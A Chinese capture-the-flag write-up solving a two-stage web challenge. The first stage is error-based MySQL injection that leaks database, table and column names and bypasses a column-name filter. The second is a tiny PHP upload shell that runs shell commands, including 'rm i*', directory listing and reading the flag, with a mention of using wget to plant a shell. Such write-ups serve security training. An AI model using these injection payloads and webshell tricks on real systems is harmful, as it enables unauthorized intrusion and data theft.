## 他们有什么秘密呢? writeup

题目由两部分组成，第一部分是一个sqli，第二部分是一个文件上传+命令执行

### 第一部分

第一个入口

http://182.254.246.93/entrance.php

id=3时，product name = nextentrance，再结合源代码里面的提示，可以得出，我们的目的是得到整个表的信息~

这里基本没有过滤，但是不能使用information_schema表，也就无从获取表名和字段信息了,当然，不会是爆破。

此外，可以发现开启了报错，所以我们可以用一些小技巧，来查出表名，字段名。

mysql很灵活，这里有多种解法的。

#### 获取数据库名

根据mysql的特性，用一个不存在的自定义函数，就可以爆出数据库名

pro_id=a()

得到数据库名 youcanneverfindme17

#### 获取表名

有一篇文章提到过，当开启报错时，polygon函数可以用来获取当前表名和其字段名，不过这里我将polygon过滤掉了，

前往

>https://dev.mysql.com/doc/refman/5.5/en/func-op-summary-ref.html 

把这几百个函数用正则处理下来，然后fuzz，会发现还有其它函数可以用


>multiPolygon(id)
>multilinestring(id)
>linestring(id)
>GeometryCollection(id)
>MultiPoint(id)
>polugon(id)

我这里过滤的时候，专门漏了linestring，用它爆出当前表名

pro_id=1 and linestring(pro_id)

#### 获取字段名

接下来就是需要得到表product_2017ctf的字段名了

开启了报错，所以这里可以使用using+join的方法来获取，

```
pro_id=1 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C
```

得到字段名:pro_id pro_name owner d067a0fa9dc61a6e

#### 获取表内容

理论上用联合查询就可以查出来了，不过这里我把最后一个字段名过滤了，

所以要在不出现字段名的情况下查出内容，将一个虚拟表和当前表联合起来即可

pro_id=-1 union select 1,a.4,3,4 from (select 1,2,3,4 from dual union select * from product_2017ctf)a limit 3,1; 

得到关键内容:7195ca99696b5a896.php


根据tip，结合一下，得到下一关入口:

d067a0fa9dc61a6e7195ca99696b5a896.php


其实这里方法是很多的，使用移位注入和比较注入同样可以查出表内容，都不需要用到字段名~

### 第二部分

上传后缀和内容都没有限制，只有一个长度的限制，还是挺简单的

创建z.php

<?=`*`;

创建bash 内容任意

创建bash2 存放要执行的命令

由于每个人的上传目录下有一个index.html，所以先要把它删掉

所以第一次执行z.php时，bash2文件内容为:

>rm i*

第二次执行z.php时，bash2文件的内容为:

>ls /

因为长度的限制，所以flag的位置肯定在根目录下的，

cat /3*

得到flag

这个是最简单的方法，也可以用wget写一个shell到目录下~
